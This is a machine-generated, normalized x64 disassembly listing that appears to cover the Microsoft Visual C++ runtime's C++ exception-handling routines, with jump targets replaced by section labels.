jle r-xdata
cmp [ rax ] 0xe0434f4d
je r-xdata
xor eax eax
add rsp 0x28
retn
call sub_140043c34
dec [ rax + 0x100 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
call sub_140043c34
and [ rax + 0x100 ] 0x0
call sub_14004e7c8
sub_140040238
mov rax rsp
mov [ rax + 0x20 ] r9d
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r13d r9d
mov rsi r8
mov r15 rdx
mov r14 rcx
call sub_14004f758
mov edi eax
call sub_14003f984
mov [ rsp + 0x28 ] rax
call sub_140043c34
inc [ rax + 0x100 ]
call sub_140043c34
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_140043c34
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_14004f780
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_14004e7ec
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_14004e7ec
movsxd r12 edi
call sub_14003f984
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_14003f984
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_14003f984
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_14003f984
add rax rbx
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_14004f780
call sub_14003f984
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
jmp r-xdata
xor eax eax
call sub_14003f984
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_14003f984
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_14004f840
mov rcx [ rsp + 0x28 ]
call sub_14003f9b4
sub_1400403c4
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_140040448
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_14004e7ec
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_14003f99c
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_14003f99c
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_14003f99c
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_14003f984
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_1400400c0
test eax eax
jne r-xdata
jmp r-xdata
sub_14004051c
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov rdi rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
and [ rsp + 0xc0 ] r13d
and [ rsp + 0x48 ] r13
and [ rsp + 0x40 ] r13
call sub_140043c34
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xd8 ] rax
call sub_140043c34
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xd0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xc8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov r15 [ rdi + 0x30 ]
mov r12 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r12
call sub_140043c34
mov [ rax + 0xf0 ] rsi
call sub_140043c34
mov [ rax + 0xf8 ] rbx
call sub_140043c34
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_14003fd44
mov r14 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r13
je r-xdata
mov r8d 0x100
mov rdx r12
mov rcx r15
call sub_14004f840
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
jmp r-xdata
mov [ rsp + 0xc0 ] 0x1
call sub_140043c34
mov rcx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rcx
mov rcx r14
call sub_14003fdbc
test r13d r13d
jne r-xdata
call sub_140043c34
mov [ rax + 0xf0 ] r15
call sub_140043c34
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_14003fd88
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_1400403c4
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_140040621
mov [ rsp + 0x20 ] 0x1
call sub_140043c34
and [ rax + 0x2c0 ] 0x0
mov rsi [ rsp + 0xc8 ]
cmp [ rsp + 0xc0 ] 0x0
je r-xdata
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
mov dl 0x1
mov rcx rsi
call sub_1400403c4
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
jmp r-xdata
call sub_140043c34
mov [ rax + 0xf0 ] r15
call sub_140043c34
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
call [ RaiseException@IAT ]
mov r13d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
mov r12 [ rsp + 0x60 ]
mov r14 [ rsp + 0x50 ]
mov rcx r14
call sub_14003fdbc
test r13d r13d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_14003fd88
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_1400403c4
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_140040730
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
test r13d r13d
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_14003f984
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
test r13d r13d
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
call sub_14003f984
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ rdi ]
test ecx ecx
js r-xdata
test [ rdi ] 0x80000000
je r-xdata
mov edi 0x1
test cl 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
test [ rsi ] dil
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_14004f888
test eax eax
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_14004f888
test eax eax
je r-xdata
call sub_14004e7ec
mov edx edi
mov rcx r12
call sub_14004f888
test eax eax
je r-xdata
mov r11 rbx
call sub_14003f99c
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
mov edx edi
mov rcx r12
call sub_14004f888
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
call sub_14004f888
test eax eax
je r-xdata
call sub_14004f888
test eax eax
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
test r11 r11
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_14003a8c0
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx edi
mov rcx r12
call sub_14004f888
test eax eax
je r-xdata
mov edx edi
mov rcx r12
call sub_14004f888
test eax eax
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_140040408
mov rdx rax
mov r8 r10
mov rcx r12
call sub_14003a8c0
jmp r-xdata
mov rcx [ r12 ]
jmp r-xdata
mov rcx rbx
call sub_14003f99c
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
lea rdx [ rsi + 0x8 ]
call sub_140040408
mov [ r12 ] rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_14004f888
test eax eax
je r-xdata
sub_140040934
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
test [ r8 ] 0x80000000
je r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
dec eax
jne r-xdata
call sub_140040730
dec eax
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_140040408
mov rdx rax
mov rcx rdi
call r10
call sub_14003f99c
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_140040408
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_14003f99c
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_1400409e4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_14003f898
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_14003f984
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xc0 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_14003fe1c
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_140040934
sub_140040aa8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
cmp [ rcx ] 0x80000003
mov r14 r9
mov r12 r8
mov r15 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xa8 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_140043c34
mov edi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_140043c34
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d r12d
mov rdx rbp
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_14003fc18
mov ecx [ rsp + 0xa0 ]
cmp ecx [ rsp + 0x50 ]
jae r-xdata
call sub_14004e7ec
cmp [ rsi ] 0xe0434f4d
je r-xdata
lea rdi [ rax + 0xc ]
cmp [ rsi ] 0xe0434352
je r-xdata
inc ecx
add rdi 0x14
mov [ rsp + 0xa0 ] ecx
cmp ecx [ rsp + 0x50 ]
jb r-xdata
cmp r12d [ rdi - 0x8 ]
jg r-xdata
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 r12
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx rsi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_14003fbc4
test eax eax
jne r-xdata
lea r13 [ rdi - 0xc ]
cmp r12d [ r13 ]
jl r-xdata
call sub_14003f984
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_14003f984
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_14003f984
add rax rbx
jmp r-xdata
call sub_14003f984
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_14003f984
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov ecx [ rsp + 0xa0 ]
call sub_14003f984
mov ecx [ rdi ]
mov r8 [ rsp + 0xb0 ]
dec ecx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r13
and [ rsp + 0x30 ] 0x0
movsxd rcx ecx
mov r9 r14
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x4 ]
mov rdx r15
add rcx rax
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_1400409e4
xor eax eax
call sub_14003f984
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_14003f984
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_140040ce0
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3f ]
sub rsp 0x90
mov rbx [ rbp + 0x67 ]
mov r13 rdx
mov rdi rcx
xor r14b r14b
mov rdx r9
mov rcx rbx
mov r15 r9
mov r12 r8
mov [ rbp + 0x47 ] r14b
call sub_14004f750
lea r9 [ rbp - 0x21 ]
mov r8 rbx
mov rdx r15
mov rcx r13
mov esi eax
call sub_14003f898
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_14004f7c8
mov r8 rbx
mov rdx r15
cmp esi eax
jle r-xdata
mov rcx r13
call sub_14004f7c8
mov esi eax
lea rcx [ rbp - 0x21 ]
mov r9d esi
call sub_14004f780
mov r9d esi
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_14004f78c
jmp r-xdata
call sub_14004e7ec
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_140043c34
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rbp + 0x6f ] 0x0
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xe8 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_14004e7ec
call sub_14004e7c8
mov rax [ rbp + 0x7f ]
mov r9 r15
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rbp + 0x77 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_140040aa8
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_140043c34
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_140043c34
mov rdi [ rax + 0xf0 ]
call sub_140043c34
mov rcx [ rdi + 0x38 ]
mov r12 [ rax + 0xf8 ]
mov [ rbp + 0x57 ] r12
call sub_14003f9d0
mov edx 0x1
mov rcx rdi
call sub_14004f888
test eax eax
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rbp + 0x77 ]
lea rax [ rbp - 0x31 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x39 ]
mov r9d esi
mov rdx rbx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_14003fc18
mov ecx [ rbp - 0x39 ]
mov edx [ rbp - 0x31 ]
cmp ecx edx
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_14004e7ec
mov esi [ rbx + 0x20 ]
test esi esi
je r-xdata
lea r12 [ rax + 0x10 ]
call sub_140043c34
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
xor eax eax
movsxd rsi esi
call sub_14003f984
add rax rsi
jmp r-xdata
inc ecx
add r12 0x14
mov [ rbp - 0x39 ] ecx
cmp ecx edx
jb r-xdata
cmp esi [ r12 - 0xc ]
jg r-xdata
call sub_140043c34
mov r12 [ rax + 0x108 ]
call sub_140043c34
mov rdx r12
and [ rax + 0x108 ] 0x0
mov rcx rdi
call sub_140040448
test al al
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
test esi esi
je r-xdata
test rax rax
je r-xdata
cmp [ r12 - 0x10 ] esi
jg r-xdata
test r14b r14b
jne r-xdata
call sub_14003f984
movsxd r13 [ r12 ]
mov r14d [ r12 - 0x4 ]
add r13 rax
mov r12 [ rbp + 0x57 ]
xor r13d r13d
cmp [ r12 ] r13d
jle r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
xor edx edx
call sub_14003f984
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rbp + 0x47 ]
mov r13 [ rbp + 0x4f ]
call sub_14003f99c
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rbp - 0x29 ] rax
call sub_14003f99c
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ecx [ rax + rdx ]
mov [ rbp - 0x35 ] ecx
test ecx ecx
jle r-xdata
call sub_14004e7c8
xor esi esi
call sub_14004e7ec
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rbp + 0x47 ]
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_14003f898
mov cl [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
and [ rsp + 0x20 ] 0x0
mov r9 rax
mov rdx rdi
mov rcx r13
call sub_14003fe1c
mov rcx rdi
call sub_140040448
test al al
jne r-xdata
dec r14d
add r13 0x14
jmp r-xdata
call sub_14003f99c
mov rcx [ rbp - 0x29 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r13
mov rdx rax
mov [ rbp - 0x19 ] rax
call sub_1400400c0
test eax eax
jne r-xdata
xor eax eax
call sub_14003f984
movsxd rcx [ r12 + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_14003f984
add rax rbx
jmp r-xdata
test r14d r14d
jle r-xdata
mov al [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov r14b 0x1
mov [ rsp + 0x40 ] al
lea rax [ r12 - 0x10 ]
mov r9 r15
mov [ rsp + 0x38 ] rax
mov rax [ rbp - 0x19 ]
mov rcx rdi
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r13
mov r13 [ rbp + 0x4f ]
mov rdx r13
mov [ rbp + 0x47 ] r14b
mov [ rsp + 0x20 ] rbx
call sub_1400409e4
jmp r-xdata
mov eax [ rbp - 0x35 ]
add [ rbp - 0x29 ] 0x4
dec eax
mov [ rbp - 0x35 ] eax
test eax eax
jg r-xdata
mov dl 0x1
mov rcx rdi
call sub_1400403c4
lea r11 [ r--data ]
lea rdx [ rbp + 0x47 ]
lea rcx [ rbp - 0x11 ]
mov [ rbp + 0x47 ] r11
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
mov [ rbp - 0x11 ] r11
call sub_14003f22c
int3
inc r13d
add rsi 0x14
cmp r13d [ r12 ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_14003ac40
test al al
jne r-xdata
mov edx [ rbp - 0x31 ]
mov ecx [ rbp - 0x39 ]
call sub_14003f984
movsxd rcx [ r12 + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_1400411d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_140043c34
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_140040ce0
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_14003f984
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_14003f9ec
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_14004f6c4
mov ebx eax
cmp eax 0xffffffff
jl r-xdata
xor r11d r11d
call sub_14003f99c
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_14004e7ec
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_14004e7ec
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_140040238
jmp r-xdata
sub_1400413fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
movsxd rax r9d
mov rbx r8
mov edi edx
mov esi ecx
test r9d r9d
jle r-xdata
mov r9d [ rsp + 0x68 ]
mov rdx [ rsp + 0x60 ]
mov r8 rbx
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] rdx
mov edx edi
mov r9d eax
mov ecx esi
call [ LCMapStringW@IAT ]
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rdx rax
mov rcx rbx
call sub_14004f894
sub_14004145c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi r9d
mov r11 r8
mov r10 rdx
mov edi ecx
test rdx rdx
jne r-xdata
test r8 r8
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rdx ] 0x0
mov edx [ rsp + 0x50 ]
mov eax edx
neg eax
sbb rcx rcx
neg rcx
inc rcx
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
